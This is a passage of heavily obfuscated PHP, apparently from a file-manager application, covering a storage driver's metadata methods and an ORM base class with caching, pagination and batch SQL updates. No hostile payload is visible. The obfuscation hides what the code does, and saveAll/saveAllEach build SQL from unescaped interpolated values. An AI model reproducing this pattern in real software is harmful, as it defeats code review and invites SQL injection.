$eã¾¶²¬İÉ); } public function hashMd5($dã½î®Ùİ³) { $FÅÜƒ´§ÜÀ =& $_SERVER[…ë˜õ]; $AÄš‚‰¦‡ = $this->_objectMeta($dã½î®Ùİ³); return isset($AÄš‚‰¦‡[$FÅÜƒ´§ÜÀ[206]]) ? $AÄš‚‰¦‡[$FÅÜƒ´§ÜÀ[206]] : !1; } public function size($E‰á‰ÁšÛ) { $fà²©ğæöÄ = $this->objectMeta($E‰á‰ÁšÛ); return $fà²©ğæöÄ ? $fà²©ğæöÄ[$_SERVER[…ë˜õ][77]] : 0; } public function info($aÕó²Óğ¸¥) { if ($this->isFolder($aÕó²Óğ¸¥)) { return $this->folderInfo($aÕó²Óğ¸¥); } else { if ($this->isFile($aÕó²Óğ¸¥)) { return $this->fileInfo($aÕó²Óğ¸¥); } } return !1; } public function exist($f¹¼Ü†ÜŠø) { return $this->isFile($f¹¼Ü†ÜŠø) || $this->isFolder($f¹¼Ü†ÜŠø); } public function isFile($F‡–°Á»ª) { return !$this->isFolder($F‡–°Á»ª) && $this->objectMeta($F‡–°Á»ª); } public function isFolder($E¢¿¼—‘‘±) { return $this->cacheMethod($_SERVER[…ë˜õ][197], $E¢¿¼—‘‘±); } protected function objectMeta($fñ’©‘‰Ò») { return $this->cacheMethod($_SERVER[…ë˜õ][198], $fñ’©‘‰Ò»); } protected function _objectMeta($f¹á„“ô‰) { goto c‚¤ã±¤ø; DÂìçîÆŠ: $Cµ¡²Ê‘»Õ = array($dŞ†¤Ø·Ø[29] => isset($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1376]]) ? $EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1376]] : null, $dŞ†¤Ø·Ø[77] => isset($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1377]]) ? $EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1377]] : null, $dŞ†¤Ø·Ø[206] => isset($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1378]]) ? $EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1378]] : null, $dŞ†¤Ø·Ø[1345] => isset($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1379]]) ? $EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1379]] : null); $Cµ¡²Ê‘»Õ[$dŞ†¤Ø·Ø[1346]] = isset($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1380]]) ? strtotime($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1380]]) : $Cµ¡²Ê‘»Õ[$dŞ†¤Ø·Ø[1345]]; return $Cµ¡²Ê‘»Õ; goto Fİ¼çÃø†Ô; c‚¤ã±¤ø: $dŞ†¤Ø·Ø =& $_SERVER[…ë˜õ]; if ($f¹á„“ô‰ == $dŞ†¤Ø·Ø[33] || $f¹á„“ô‰ == $dŞ†¤Ø·Ø[8]) { return array(); } $Aã „öÚÖ÷ = $this->ussRequest($f¹á„“ô‰, $dŞ†¤Ø·Ø[1375]); goto bÄ¦‚»Ø˜; bÄ¦‚»Ø˜: if (!$Aã „öÚÖ÷[$dŞ†¤Ø·Ø[1091]]) { return null; } $EÕ•Û®ÒÜ† = isset($Aã „öÚÖ÷[$dŞ†¤Ø·Ø[1093]]) ? $Aã „öÚÖ÷[$dŞ†¤Ø·Ø[1093]] : array(); if (!isset($EÕ•Û®ÒÜ†[$dŞ†¤Ø·Ø[1376]])) { return null; } goto DÂìçîÆŠ; Fİ¼çÃø†Ô: } protected function _isFolder($d«’½ğŠÇŞ) { $EÃõò•İ²Æ =& $_SERVER[…ë˜õ]; if ($d«’½ğŠÇŞ == $EÃõò•İ²Æ[33] || $d«’½ğŠÇŞ == $EÃõò•İ²Æ[8]) { return !0; } $Bô»’‘’° = $this->_objectMeta($d«’½ğŠÇŞ); return isset($Bô»’‘’°[$EÃõò•İ²Æ[29]]) && $Bô»’‘’°[$EÃõò•İ²Æ[29]] == $EÃõò•İ²Æ[76] ? !0 : !1; } } $eå»”å¦™× = $_SERVER[$_SERVER[…ë˜õ][825]]; $dè†æğí¯ô = $_SERVER[…ë˜õ][844]; goto eñòï«ÒòŸ; D†êèÏ³ Û: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\x72\164\54\x75\x70\144\x61\x74\x65", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\143\x72\145\x61\164\x65\124\x69\155\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\151\157\156")); public function setDataAuto($F­Ú—ê¶ğ‡) { $this->dataAuto = $F­Ú—ê¶ğ‡; } public function __construct($eñî¹¾©è„ = '', $F“±—ØËÉ = '', $D—Ã×” = '') { parent::__construct($eñî¹¾©è„, $F“±—ØËÉ, $D—Ã×”); } public static function textEncode($fà‰™±ìòê) { if (!$fà‰™±ìòê) { return $fà‰™±ìòê; } $ağ¬˜øÙµ = json_encode($fà‰™±ìòê); $ağ¬˜øÙµ = preg_replace_callback($_SERVER[…ë˜õ][351], function ($fªˆ–¡¾“°) { return addslashes($fªˆ–¡¾“°[0]); }, $ağ¬˜øÙµ); return json_decode($ağ¬˜øÙµ); } public static function textDecode($a¹ä—ÊÛö–) { $EËÀ‘ò©‡ƒ =& $_SERVER[…ë˜õ]; $a–Å°àö„’ = json_encode($a¹ä—ÊÛö–); $a–Å°àö„’ = preg_replace_callback($EËÀ‘ò©‡ƒ[352], function ($F‹˜¶ø×¥ã) { return $_SERVER[…ë˜õ][96]; }, $a–Å°àö„’); return json_decode($a–Å°àö„’); } protected $tableMeta = array(); protected function _beforeInsert(&$a»İò£†Ğ¬, $C™®½¡Íïœ) { $E¹‰¤È‰ä³ =& $_SERVER[…ë˜õ]; if (!$this->checkDataAutoHas($E¹‰¤È‰ä³[353])) { return; } $this->dataBeforeFilter($a»İò£†Ğ¬, $E¹‰¤È‰ä³[353]); } protected function _beforeUpdate(&$bÃ¼´†Ëã®, $døœğ°™ÖÃ) { $AèÛôÆÀ° =& $_SERVER[…ë˜õ]; if (!$this->checkDataAutoHas($AèÛôÆÀ°[354])) { return; } $this->dataBeforeFilter($bÃ¼´†Ëã®, $AèÛôÆÀ°[354]); } protected function _afterSelect(&$Aìœ‘ç„Ò, $fî éÜ÷¢É) { if (!is_array($Aìœ‘ç„Ò)) { return; } if (!$this->checkDataAutoHas($_SERVER[…ë˜õ][355])) { return; } foreach ($Aìœ‘ç„Ò as &$bŞ»“Ğ„¨‡) { $this->dataAfterFilter($bŞ»“Ğ„¨‡); } unset($bŞ»“Ğ„¨‡); } protected function _afterFind(&$bÔËï“Ï÷º, $FëŒÈ´¾Æµ) { if (!is_array($bÔËï“Ï÷º)) { return; } if (!$this->checkDataAutoHas($_SERVER[…ë˜õ][355])) { return; } $this->dataAfterFilter($bÔËï“Ï÷º); } public function setAutoIncrement($eìâ³ †¸‘) { $f¯øÅ‡Î¢Å = array($this->getPk() => $eìâ³ †¸‘); $aÙòÇ¾ô = $this->data($f¯øÅ‡Î¢Å)->add(); if ($aÙòÇ¾ô) { $this->delete($aÙòÇ¾ô); } } public function getAutoIncrement() { $F¿Öºë¨ĞÈ = $this->getTableName(); $DÂÎ‘Ş¾¯ = $this->max($this->getPk()); $BªæË¹î = $this->query("\x73\150\157\x77\x20\164\x61\x62\154\x65\40\163\164\141\164\x75\163\40\x77\x68\145\162\x65\x20\x4e\141\x6d\x65\x3d\47{$F¿Öºë¨ĞÈ}\x27"); $bœñ »™„ö = $BªæË¹î[0][$_SERVER[…ë˜õ][356]]; $AŠòêåÀŠº = max($DÂÎ‘Ş¾¯, $bœñ »™„ö); return $AŠòêåÀŠº; } protected function _callBefore($FÀœ½ğİ»Ô, $cù«’„òÒ©) { return $this->cacheCallCheck($FÀœ½ğİ»Ô, $cù«’„òÒ©, !1); } protected function _callAfter($D¨ä§ßçò, $e„ºÆ¯ÂØñ) { return $this->cacheCallCheck($D¨ä§ßçò, $e„ºÆ¯ÂØñ, !0); } protected function cacheFunctionAlias($dŠµÁ¢áæÉ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($BèÊ¥®è¿¹, $FàùäÓ­¸, $BÊÌ§áÂÜÍ = false) { $b¢‰ÇËÁ ¤ = $this->cacheFunctionAlias($FàùäÓ­¸); if (!$b¢‰ÇËÁ ¤) { return; } foreach ($b¢‰ÇËÁ ¤ as $aÉ‘œÑ±‰Â => $F”ôÇ°ˆ†) { $aÓ¢äÇô¼‚ = $F”ôÇ°ˆ†[0]; $f• Ñ¶à¼Í = explode($_SERVER[…ë˜õ][47], $F”ôÇ°ˆ†[1]); if ($BèÊ¥®è¿¹ == $aÉ‘œÑ±‰Â) { return $this->cacheFunctionGet($aÉ‘œÑ±‰Â, $aÓ¢äÇô¼‚); } if ($BÊÌ§áÂÜÍ && in_array($BèÊ¥®è¿¹, $f• Ñ¶à¼Í)) { $this->cacheFunctionClear($aÉ‘œÑ±‰Â, $aÓ¢äÇô¼‚); } } } public function cacheFunctionGet($Aí„öÏ³ˆµ, $dˆïéÌæŸ) { $Eİ¨î·ùÄ— = $this->cacheKeyMake($Aí„öÏ³ˆµ, $dˆïéÌæŸ); $FàëŸŠóÌØ = Cache::get($Eİ¨î·ùÄ—); if (!is_array($FàëŸŠóÌØ)) { $FàëŸŠóÌØ = call_user_func_array(array($this, $Aí„öÏ³ˆµ), array($dˆïéÌæŸ, !0)); Cache::set($Eİ¨î·ùÄ—, $FàëŸŠóÌØ); } return $FàëŸŠóÌØ; } public function cacheFunctionClear($B± ˜½ëÙİ, $dˆÏØ¥Ã) { $aì²™Ê×è¶ = $dˆÏØ¥Ã; if (!is_array($dˆÏØ¥Ã)) { $aì²™Ê×è¶ = array($dˆÏØ¥Ã); } foreach ($aì²™Ê×è¶ as $FŒª’¦…î) { $A®¾Âƒ„áÕ = $this->cacheKeyMake($B± ˜½ëÙİ, $FŒª’¦…î); Cache::remove($A®¾Âƒ„áÕ); } } private function cacheKeyMake($DÒà—ö˜¦¦, $fª¨ŸÜëòÁ) { $c´­„ğ¯°Š =& $_SERVER[…ë˜õ]; return get_class($this) . $c´­„ğ¯°Š[70] . $DÒà—ö˜¦¦ . $c´­„ğ¯°Š[357] . $fª¨ŸÜëòÁ; } protected function selectPageReset() { $a°µä¨¯Àæ =& $_SERVER[…ë˜õ]; if (isset($GLOBALS[$a°µä¨¯Àæ[358]])) { return; } $GLOBALS[$a°µä¨¯Àæ[358]] = isset($GLOBALS[$a°µä¨¯Àæ[7]][$a°µä¨¯Àæ[359]]) ? $GLOBALS[$a°µä¨¯Àæ[7]][$a°µä¨¯Àæ[359]] : !1; $GLOBALS[$a°µä¨¯Àæ[360]] = isset($GLOBALS[$a°µä¨¯Àæ[7]][$a°µä¨¯Àæ[349]]) ? $GLOBALS[$a°µä¨¯Àæ[7]][$a°µä¨¯Àæ[349]] : !1; $GLOBALS[$a°µä¨¯Àæ[7]][$a°µä¨¯Àæ[359]] = !1; $GLOBALS[$a°µä¨¯Àæ[7]][$a°µä¨¯Àæ[349]] = !1; } protected function selectPageRestore() { $c˜Ç•Æ¡Øæ =& $_SERVER[…ë˜õ]; if (!isset($GLOBALS[$c˜Ç•Æ¡Øæ[358]])) { return; } $GLOBALS[$c˜Ç•Æ¡Øæ[7]][$c˜Ç•Æ¡Øæ[359]] = $GLOBALS[$c˜Ç•Æ¡Øæ[358]]; $GLOBALS[$c˜Ç•Æ¡Øæ[7]][$c˜Ç•Æ¡Øæ[349]] = $GLOBALS[$c˜Ç•Æ¡Øæ[360]]; unset($GLOBALS[$c˜Ç•Æ¡Øæ[358]]); unset($GLOBALS[$c˜Ç•Æ¡Øæ[360]]); } protected function selectPage($A÷Ğ®àïÏ = 200, $cè´‰„Øç = 1) { goto f×ÀóÍåĞÛ; f×ÀóÍåĞÛ: $AëŸÌÉ¾Äƒ =& $_SERVER[…ë˜õ]; global $in; $cÎ·óË·Ëâ = $this->optionsValue(); goto D±®ôÌˆ; e¼èÔÚ°‘ˆ: return $eÌ®£„›ƒ¯; goto d“¼‹Ï††á; aŸ÷ôŠ¿ê: $cøÅîÕİÏ‘ = array(); $eó”ßŠ·òğ = 1; if ($cè´‰„Øç == 1 && $eó”ßŠ·òğ) { $this->optionsValue($cÎ·óË·Ëâ); $cøÅîÕİÏ‘ = $this->page($cè´‰„Øç, $A÷Ğ®àïÏ)->select(); $D—éòïÕ¾ì = is_array($cøÅîÕİÏ‘) ? count($cøÅîÕİÏ‘) : 0; if ($D—éòïÕ¾ì < $A÷Ğ®àïÏ) { $b¸Ü³“˜ = 1; } else { $this->optionsValue($E®ì¤†¸ßÍ); $D—éòïÕ¾ì = intval($this->count()); $b¸Ü³“˜ = ceil($D—éòïÕ¾ì / $A÷Ğ®àïÏ); } } else { $this->optionsValue($E®ì¤†¸ßÍ); $D—éòïÕ¾ì = intval($this->count()); $b¸Ü³“˜ = ceil($D—éòïÕ¾ì / $A÷Ğ®àïÏ); $cè´‰„Øç = $cè´‰„Øç >= $b¸Ü³“˜ ? $b¸Ü³“˜ : $cè´‰„Øç; $this->optionsValue($cÎ·óË·Ëâ); $cøÅîÕİÏ‘ = $this->page($cè´‰„Øç, $A÷Ğ®àïÏ)->select(); } goto dÏˆ¾¿¼Á¢; D±®ôÌˆ: $eÄªÔÚÁÚ = 50000; $A÷Ğ®àïÏ = isset($in[$AëŸÌÉ¾Äƒ[359]]) && $in[$AëŸÌÉ¾Äƒ[359]] ? $in[$AëŸÌÉ¾Äƒ[359]] : $A÷Ğ®àïÏ; if ($A÷Ğ®àïÏ === -1) { $in[$AëŸÌÉ¾Äƒ[359]] = !1; $eÄªÔÚÁÚ = 100000000; $A÷Ğ®àïÏ = $eÄªÔÚÁÚ; } goto fÁÌ…ŒÍ; fÁÌ…ŒÍ: $E®ì¤†¸ßÍ = $cÎ·óË·Ëâ; $E®ì¤†¸ßÍ[$AëŸÌÉ¾Äƒ[361]] = array(); $A÷Ğ®àïÏ = intval($A÷Ğ®àïÏ); goto e²íÜ­×œƒ; dÏˆ¾¿¼Á¢: if (!is_array($cøÅîÕİÏ‘)) { $cøÅîÕİÏ‘ = array(); } if ($b¸Ü³“˜ == 1) { $D—éòïÕ¾ì = count($cøÅîÕİÏ‘); } $eÌ®£„›ƒ¯ = array($AëŸÌÉ¾Äƒ[362] => array($AëŸÌÉ¾Äƒ[363] => $D—éòïÕ¾ì, $AëŸÌÉ¾Äƒ[359] => $A÷Ğ®àïÏ, $AëŸÌÉ¾Äƒ[349] => $cè´‰„Øç, $AëŸÌÉ¾Äƒ[364] => $b¸Ü³“˜), $AëŸÌÉ¾Äƒ[365] => $cøÅîÕİÏ‘); goto e¼èÔÚ°‘ˆ; e²íÜ­×œƒ: $A÷Ğ®àïÏ = $A÷Ğ®àïÏ <= 5 ? 5 : ($A÷Ğ®àïÏ >= $eÄªÔÚÁÚ ? $eÄªÔÚÁÚ : $A÷Ğ®àïÏ); $cè´‰„Øç = intval(isset($in[$AëŸÌÉ¾Äƒ[349]]) && $in[$AëŸÌÉ¾Äƒ[349]] ? $in[$AëŸÌÉ¾Äƒ[349]] : $cè´‰„Øç); $cè´‰„Øç = $cè´‰„Øç <= 1 ? 1 : $cè´‰„Øç; goto aŸ÷ôŠ¿ê; d“¼‹Ï††á: } protected function checkLength($CÍÄÙëë–‚, $aôæ„“Šõ¹ = 0, $b«‹è®ê¦º = '') { $bìä íÏœÎ =& $_SERVER[…ë˜õ]; $aôæ„“Šõ¹ = $aôæ„“Šõ¹ ? $aôæ„“Šõ¹ : 65536; if (!$CÍÄÙëë–‚ || strlen($CÍÄÙëë–‚) < $aôæ„“Šõ¹) { return; } $b«‹è®ê¦º = $b«‹è®ê¦º ? $b«‹è®ê¦º . $bìä íÏœÎ[67] : $bìä íÏœÎ[33]; show_json($b«‹è®ê¦º . LNG($bìä íÏœÎ[366]) . "\x28{$aôæ„“Šõ¹}\x29", !1); } protected function metaSet($DŸ÷İ»¸’ó, $BÖª¦Ş¨ƒ¿ = null, $Aó—Ã£Çó = null) { goto FÄ‹‹¥š¿â; AñæÁîöƒ: $b²˜å¾Ì²ß = $b¸‚Š¯ æô[371] . $this->tableMeta; CacheLock::lock($b²˜å¾Ì²ß); $EŞÉËğ³‡->where(array($AŠ¿³åâôê => $DŸ÷İ»¸’ó))->addAll($BÌ‘ó ô†, array(), !0); goto c£½”Ëé; DØ¥™¢‡‚ì: if (is_null($BÖª¦Ş¨ƒ¿)) { return $EŞÉËğ³‡->where(array($AŠ¿³åâôê => $DŸ÷İ»¸’ó))->delete(); } if (is_null($Aó—Ã£Çó) && is_string($BÖª¦Ş¨ƒ¿)) { return $EŞÉËğ³‡->where($E¸š¿Ï™Ÿ)->delete(); } $F÷‘ôÉ¹åÄ = is_array($BÖª¦Ş¨ƒ¿) ? $BÖª¦Ş¨ƒ¿ : array(); goto c³î·ÆĞˆÙ; c£½”Ëé: CacheLock::unlock($b²˜å¾Ì²ß); return !0; goto c†ÁêÀƒ; fáê’œ³·†: $E‹¯»íŞ´¦ = $this->tableMeta[$b¸‚Š¯ æô[368]]; $EŞÉËğ³‡ = Model($E‹¯»íŞ´¦); $E¸š¿Ï™Ÿ = array($AŠ¿³åâôê => $DŸ÷İ»¸’ó, $b¸‚Š¯ æô[369] => $BÖª¦Ş¨ƒ¿); goto DØ¥™¢‡‚ì; c³î·ÆĞˆÙ: if (is_string($BÖª¦Ş¨ƒ¿)) { $F÷‘ôÉ¹åÄ[$BÖª¦Ş¨ƒ¿] = $Aó—Ã£Çó; } $BÌ‘ó ô† = array(); foreach ($F÷‘ôÉ¹åÄ as $dòÇéÜˆ¡Ò => $A–’†¥®) { $this->checkLength($A–’†¥®, !1, $E‹¯»íŞ´¦ . $b¸‚Š¯ æô[4] . $dòÇéÜˆ¡Ò); $BÌ‘ó ô†[] = array($AŠ¿³åâôê => $DŸ÷İ»¸’ó, $b¸‚Š¯ æô[92] => $dòÇéÜˆ¡Ò, $b¸‚Š¯ æô[370] => $A–’†¥®); } goto AñæÁîöƒ; FÄ‹‹¥š¿â: $b¸‚Š¯ æô =& $_SERVER[…ë˜õ]; if (!$this->tableMeta || !$DŸ÷İ»¸’ó) { return !1; } $AŠ¿³åâôê = $this->tableMeta[$b¸‚Š¯ æô[367]]; goto fáê’œ³·†; c†ÁêÀƒ: } public function metaGet($AÉ‰ëíµ¿¼, $A…„Ù´–‘ = false) { goto DĞé»ó±¼; d½ä¤Ï‰¾ñ: $dÑ­Ø”ºËÁ = Model($this->tableMeta[$d©î¬Ÿ©ŸÚ[368]]); if ($A…„Ù´–‘) { $a›÷êŸÇœè = array($bÁ”õ²ƒøê => $AÉ‰ëíµ¿¼, $d©î¬Ÿ©ŸÚ[92] => $A…„Ù´–‘); return $dÑ­Ø”ºËÁ->where($a›÷êŸÇœè)->getField($d©î¬Ÿ©ŸÚ[370]); } $a›÷êŸÇœè = array($bÁ”õ²ƒøê => $AÉ‰ëíµ¿¼); goto añ•Ë¯²—ø; DĞé»ó±¼: $d©î¬Ÿ©ŸÚ =& $_SERVER[…ë˜õ]; if (!$this->tableMeta) { return array(); } $bÁ”õ²ƒøê = $this->tableMeta[$d©î¬Ÿ©ŸÚ[367]]; goto d½ä¤Ï‰¾ñ; añ•Ë¯²—ø: $f¿»œÃ´æ = $dÑ­Ø”ºËÁ->field($d©î¬Ÿ©ŸÚ[372])->where($a›÷êŸÇœè)->select(); $f¿»œÃ´æ = array_to_keyvalue($f¿»œÃ´æ, $d©î¬Ÿ©ŸÚ[92], $d©î¬Ÿ©ŸÚ[370]); return $f¿»œÃ´æ; goto bèØ¸ŞŸ±; bèØ¸ŞŸ±: } private function checkDataAutoHas($D›ÄŒµ”Ó©) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $BÜÇÆ™˜÷) { if (in_array($D›ÄŒµ”Ó©, explode($_SERVER[…ë˜õ][47], $BÜÇÆ™˜÷[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$CÓÏŒù Ê¬, $EÜ¹Á½Œß) { $Fùö™İÂÒÆ =& $_SERVER[…ë˜õ]; foreach ($this->dataAuto as $B¸Õ˜–¶ƒ¡) { $D«¶Çğõ‰’ = $B¸Õ˜–¶ƒ¡[0]; if (!in_array($EÜ¹Á½Œß, explode($Fùö™İÂÒÆ[47], $B¸Õ˜–¶ƒ¡[2]))) { continue; } switch (trim($B¸Õ˜–¶ƒ¡[3])) { case $Fùö™İÂÒÆ[317]: case $Fùö™İÂÒÆ[318]: $bË“Ğ…È„‹ = $B¸Õ˜–¶ƒ¡[1]; $aà¯„±¡¾ = isset($B¸Õ˜–¶ƒ¡[4]) ? (array) $B¸Õ˜–¶ƒ¡[4] : array(); if ($bË“Ğ…È„‹ == $Fùö™İÂÒÆ[195] && array_key_exists($D«¶Çğõ‰’, $CÓÏŒù Ê¬)) { if (!$CÓÏŒù Ê¬[$D«¶Çğõ‰’]) { unset($CÓÏŒù Ê¬[$D«¶Çğõ‰’]); } break; } if (isset($CÓÏŒù Ê¬[$D«¶Çğõ‰’])) { array_unshift($aà¯„±¡¾, $CÓÏŒù Ê¬[$D«¶Çğõ‰’]); } if ($Fùö™İÂÒÆ[317] == $B¸Õ˜–¶ƒ¡[3]) { $CÓÏŒù Ê¬[$D«¶Çğõ‰’] = call_user_func_array($bË“Ğ…È„‹, $aà¯„±¡¾); } else { $CÓÏŒù Ê¬[$D«¶Çğõ‰’] = call_user_func_array(array(&$this, $bË“Ğ…È„‹), $aà¯„±¡¾); } break; case $Fùö™İÂÒÆ[269]: $CÓÏŒù Ê¬[$D«¶Çğõ‰’] = $CÓÏŒù Ê¬[$B¸Õ˜–¶ƒ¡[1]]; break; case $Fùö™İÂÒÆ[290]: if (isset($CÓÏŒù Ê¬[$D«¶Çğõ‰’]) && !is_string($CÓÏŒù Ê¬[$D«¶Çğõ‰’])) { $CÓÏŒù Ê¬[$D«¶Çğõ‰’] = json_encode_force($CÓÏŒù Ê¬[$D«¶Çğõ‰’]); } break; case $Fùö™İÂÒÆ[319]: if ($CÓÏŒù Ê¬[$D«¶Çğõ‰’] === $Fùö™İÂÒÆ[33]) { unset($CÓÏŒù Ê¬[$D«¶Çğõ‰’]); } break; case $Fùö™İÂÒÆ[320]: $CÓÏŒù Ê¬[$D«¶Çğõ‰’] = $B¸Õ˜–¶ƒ¡[1]; default: break; } } if ($EÜ¹Á½Œß == $Fùö™İÂÒÆ[353]) { $D‹Ô¶¼»ø‚ = strtolower($this->db->getDbType()); if (strpos($D‹Ô¶¼»ø‚, $Fùö™İÂÒÆ[9]) !== 0) { return; } $C·¬¸÷äÜ¤ = $this->field(!0)->fields; $f¡©Ù—ç†ë = $C·¬¸÷äÜ¤[$Fùö™İÂÒÆ[248]]; if (isset($C·¬¸÷äÜ¤[$Fùö™İÂÒÆ[247]])) { unset($f¡©Ù—ç†ë[$C·¬¸÷äÜ¤[$Fùö™İÂÒÆ[247]]]); } foreach ($f¡©Ù—ç†ë as $bëÏ‰¸  => $EÜ¹Á½Œß) { if (!isset($CÓÏŒù Ê¬[$bëÏ‰¸ ])) { $CÓÏŒù Ê¬[$bëÏ‰¸ ] = $Fùö™İÂÒÆ[33]; } } } } private function dataAfterFilter(&$dÖÎ…Ğ· ) { $dÖ½†Ù§­ =& $_SERVER[…ë˜õ]; foreach ($this->dataAuto as $cáé¶ƒœôˆ) { $Cœ–îœ¯ = $cáé¶ƒœôˆ[0]; if (!in_array($dÖ½†Ù§­[355], explode($dÖ½†Ù§­[47], $cáé¶ƒœôˆ[2]))) { continue; } if (!isset($dÖÎ…Ğ· [$Cœ–îœ¯])) { continue; } switch (trim($cáé¶ƒœôˆ[3])) { case $dÖ½†Ù§­[317]: case $dÖ½†Ù§­[318]: $Fƒ×…°†ö† = isset($cáé¶ƒœôˆ[4]) ? (array) $cáé¶ƒœôˆ[4] : array(); array_unshift($Fƒ×…°†ö†, $dÖÎ…Ğ· [$Cœ–îœ¯]); if ($dÖ½†Ù§­[317] == $cáé¶ƒœôˆ[3]) { $dÖÎ…Ğ· [$Cœ–îœ¯] = call_user_func_array($cáé¶ƒœôˆ[1], $Fƒ×…°†ö†); } else { $dÖÎ…Ğ· [$Cœ–îœ¯] = call_user_func_array(array(&$this, $cáé¶ƒœôˆ[1]), $Fƒ×…°†ö†); } break; case $dÖ½†Ù§­[269]: $dÖÎ…Ğ· [$Cœ–îœ¯] = $dÖÎ…Ğ· [$cáé¶ƒœôˆ[1]]; break; case $dÖ½†Ù§­[290]: $A„—¹½ÆóÜ = $dÖÎ…Ğ· [$Cœ–îœ¯]; $dÖÎ…Ğ· [$Cœ–îœ¯] = json_decode($A„—¹½ÆóÜ, !0); if (is_null($dÖÎ…Ğ· [$Cœ–îœ¯])) { $dÖÎ…Ğ· [$Cœ–îœ¯] = $A„—¹½ÆóÜ; } break; case $dÖ½†Ù§­[319]: if ($dÖÎ…Ğ· [$Cœ–îœ¯] === $dÖ½†Ù§­[33]) { unset($dÖÎ…Ğ· [$Cœ–îœ¯]); } break; case $dÖ½†Ù§­[320]: $dÖÎ…Ğ· [$Cœ–îœ¯] = $cáé¶ƒœôˆ[1]; default: break; } } } public function saveAll($aî…—³Ù·Ä) { goto Bª£„Ú…´; Fã‘±µÛ‡‰: $aî…—³Ù·Ä = is_array($aî…—³Ù·Ä) ? $aî…—³Ù·Ä : array(); $d§®Ôˆ—¢Ò = $fñ‰ÉÜ¡ĞÛ[373]; $fñ®ÄÀÖ· = 0; goto dŠ¦‚¾”²²; dŠ¦‚¾”²²: $Fäó«¿¼Úç = array(); $Báàé‰„’„ = count($aî…—³Ù·Ä); for ($aâÁÁŠÕ¾ = 0; $aâÁÁŠÕ¾ < $Báàé‰„’„; $aâÁÁŠÕ¾++) { $f­öö¯Ä•Ë = $aî…—³Ù·Ä[$aâÁÁŠÕ¾]; if (!is_array($f­öö¯Ä•Ë) || count($f­öö¯Ä•Ë) != 4) { continue; } $eºßÇ÷˜ = "\x55\x50\x44\x41\x54\x45\x20\x60{$D³–¯¯ÜÆ}\140\40\123\x45\124\x20{$f­öö¯Ä•Ë[2]}\x20\x3d\x20\103\101\123\105\x20{$f­öö¯Ä•Ë[0]}\x20\xa"; if ($fñ®ÄÀÖ· == 0) { $d§®Ôˆ—¢Ò = $eºßÇ÷˜; } $Fäó«¿¼Úç[] = $fñ‰ÉÜ¡ĞÛ[115] . $f­öö¯Ä•Ë[1] . $fñ‰ÉÜ¡ĞÛ[115]; $fñ®ÄÀÖ·++; $d§®Ôˆ—¢Ò .= "\40\127\110\105\x4e\x20\47{$f­öö¯Ä•Ë[1]}\x27\x20\124\110\x45\x4e\x20\x27{$f­öö¯Ä•Ë[3]}\47\x20\xa"; if ($fñ®ÄÀÖ· == $Câº¾ëİÇ¨ || $aâÁÁŠÕ¾ == $Báàé‰„’„ - 1) { goto F¦¾Ø“ó; AÚÃ†ˆë–Ó: $fñ®ÄÀÖ· = 0; $d§®Ôˆ—¢Ò = $eºßÇ÷˜; $this->chunkEventCheck(count($Fäó«¿¼Úç)); goto bÚÛß©ôÓô; F¦¾Ø“ó: $cŒõî¬œ… = implode($fñ‰ÉÜ¡ĞÛ[47], $Fäó«¿¼Úç); $d§®Ôˆ—¢Ò .= "\40\x45\116\104\40\x20\x57\x48\x45\x52\105\x20{$f­öö¯Ä•Ë[0]}\40\x49\x4e\x20\50{$cŒõî¬œ…}\x29\x20"; $this->execute($d§®Ôˆ—¢Ò); goto AÚÃ†ˆë–Ó; bÚÛß©ôÓô: $Fäó«¿¼Úç = array(); goto B„Õãİ©”²; B„Õãİ©”²: } } goto DÓ¹‹å¢â‹; Bª£„Ú…´: $fñ‰ÉÜ¡ĞÛ =& $_SERVER[…ë˜õ]; $D³–¯¯ÜÆ = $this->tablePrefix . $this->tableName; $Câº¾ëİÇ¨ = self::SQL_WHERE_IN_CHUNK; goto Fã‘±µÛ‡‰; DÓ¹‹å¢â‹: $this->chunkEventSet(); goto EñˆŒœº¼; EñˆŒœº¼: } public function saveAllEach($d½Ç——ÆÜ) { $cˆš†îÄ”Ã =& $_SERVER[…ë˜õ]; $bõ¬ïëƒê = $this->tablePrefix . $this->tableName; foreach ($d½Ç——ÆÜ as $eµò¶Öæ) { if (!is_array($eµò¶Öæ) || count($eµò¶Öæ) != 4) { continue; } $d¯èù›Üí = $eµò¶Öæ[0] . $cˆš†îÄ”Ã[374] . $eµò¶Öæ[1] . $cˆš†îÄ”Ã[115]; $fˆÀ¯İòÆ = $eµò¶Öæ[2] . $cˆš†îÄ”Ã[374] . $eµò¶Öæ[3] . $cˆš†îÄ”Ã[115]; $bò…–â¯Ä‚ = "\x75\160\x64\141\x74\145\40{$bõ¬ïëƒê}\x20\163\145\x74\40{$fˆÀ¯İòÆ}\x20\x77\150\x65\x72\x65\40{$d¯èù›Üí}\x3b"; $this->execute($bò…–â¯Ä‚); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($bÍìŒÑÁß™ = false, $aÅ÷¶æ·®å = false) { $this->_chunkEvent = $bÍìŒÑÁß™; $this->_chunkEventParam = $aÅ÷¶æ·®å; } private function chunkEventCheck($aÃğŞãğ‡Ç) { if (!$this->_chunkEvent) { return; } $A¤áßçÛè = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $A¤áßçÛè[$_SERVER[…ë˜õ][375]] = $aÃğŞãğ‡Ç; Hook::trigger($this->_chunkEvent, $A¤áßçÛè); } public function addAll($DÂ…¤•Úª‹, 